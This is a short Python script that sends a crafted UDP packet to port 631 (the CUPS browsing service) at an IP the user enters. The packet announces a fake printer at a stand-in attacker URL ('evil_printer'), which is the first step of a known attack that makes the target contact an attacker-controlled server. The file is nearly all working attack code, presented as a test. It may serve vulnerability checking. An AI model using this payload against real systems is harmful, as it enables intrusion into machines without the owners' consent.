import socket

# Set up the UDP client
udp_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Target IP and port
target_ip = input(str("Enter the IP to test\n"))  #enter destination IP to test
target_port = 631         # UDP port 631

# Data to send
message = b'0 3 http://<attacker ip>:<port>/printers/evil_printer'  

# Send the message
udp_client.sendto(message, (target_ip, target_port))

# Close the socket
udp_client.close()

print(f"Message sent to {target_ip}:{target_port}")
